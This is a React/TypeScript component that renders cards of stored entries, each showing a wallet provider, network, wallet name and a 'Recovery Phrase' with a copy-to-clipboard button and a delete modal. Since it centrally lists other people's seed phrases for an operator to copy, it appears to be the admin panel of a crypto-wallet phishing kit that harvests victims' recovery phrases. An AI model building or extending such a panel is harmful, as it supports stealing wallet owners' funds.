import { motion, AnimatePresence } from "motion/react";
import { useState } from "react";
import { Copy, Trash2 } from "lucide-react";

interface UserEntry {
  id: string;
  blockchainNetwork?: string;
  walletProvider: string;
  siPhrase: string;
  walletName: string;
  timestamp?: string;
}

interface UsersCardProps {
  entry: UserEntry;
  index: number;
  onDelete: (arg: string) => void;
}

export default function UsersCard({ entry, index, onDelete }: UsersCardProps) {
  const [copiedSeed, setCopiedSeed] = useState(false);
  const [showDeleteConfirm, setShowDeleteConfirm] = useState(false);

  const handleCopy = async () => {
    await navigator.clipboard.writeText(entry.siPhrase);
    setCopiedSeed(true);
    setTimeout(() => setCopiedSeed(false), 2000);
  };

  const handleConfirmDelete = () => {
    onDelete(entry.id);
    setShowDeleteConfirm(false);
  };

  return (
    <>
      {/* Card */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.4, delay: index * 0.05 }}
        className="glass-card p-6 hover:neon-border-blue transition-all duration-300 group"
      >
        {/* Header */}
        <div className="mb-4 pb-3 border-b border-border/40">
          <h3 className="font-orbitron font-semibold text-lg capitalize">
            {entry.walletProvider}
          </h3>
          <p className="text-xs text-muted-foreground">
            {entry.blockchainNetwork || "Unknown network"}
          </p>
          <p className="text-xs text-muted-foreground">
            {entry.walletName}
          </p>
        </div>

        {/* Seed Phrase */}
        <div className="space-y-2">
          <label className="text-xs text-muted-foreground block">
            Recovery Phrase
          </label>

          <div className="relative">
            <p className="text-sm break-all bg-input/60 p-3 rounded-md border border-border">
              {entry.siPhrase}
            </p>

            <button
              onClick={handleCopy}
              className="absolute top-2 right-2 flex items-center gap-1 text-xs px-2 py-1 rounded-md backdrop-blur-md 
                bg-primary/10 text-primary hover:bg-primary/20 transition-all"
            >
              <Copy className="w-3 h-3" />
              {copiedSeed ? "Copied" : "Copy"}
            </button>
          </div>
        </div>

        {/* Actions */}
        <div className="pt-4 mt-4 border-t border-border/40 flex justify-end">
          <button
            onClick={() => setShowDeleteConfirm(true)}
            className="flex items-center gap-2 text-sm px-3 py-1.5 rounded-md
              bg-destructive/10 text-destructive hover:bg-destructive/20 transition-all"
          >
            <Trash2 className="w-4 h-4" />
            Delete
          </button>
        </div>
      </motion.div>

      {/* Delete Confirmation Modal */}
      <AnimatePresence>
        {showDeleteConfirm && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 bg-background/80 backdrop-blur flex items-center justify-center p-4"
            onClick={() => setShowDeleteConfirm(false)}
          >
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="glass-card p-6 max-w-md w-full space-y-4"
              onClick={(e) => e.stopPropagation()}
            >
              <h4 className="font-orbitron font-semibold text-xl">
                Confirm Deletion
              </h4>

              <p className="text-sm text-muted-foreground">
                This action is{" "}
                <span className="text-destructive font-semibold">
                  irreversible
                </span>
                .
              </p>

              <div className="bg-muted/40 p-3 rounded-md border border-border">
                <p className="text-xs text-muted-foreground mb-1">
                  Wallet to be deleted
                </p>
                <p className="font-medium capitalize">
                  {entry.walletName} ({entry.walletProvider})
                </p>
              </div>

              <div className="flex justify-end gap-3 pt-4 border-t border-border/40">
                <button
                  onClick={() => setShowDeleteConfirm(false)}
                  className="px-4 py-2 rounded-md text-sm
                    bg-muted/40 hover:bg-muted/60 transition-all"
                >
                  Cancel
                </button>

                <button
                  onClick={handleConfirmDelete}
                  className="px-4 py-2 rounded-md text-sm
                    bg-destructive/10 text-destructive hover:bg-destructive/20 transition-all"
                >
                  Delete Forever
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </>
  );
}
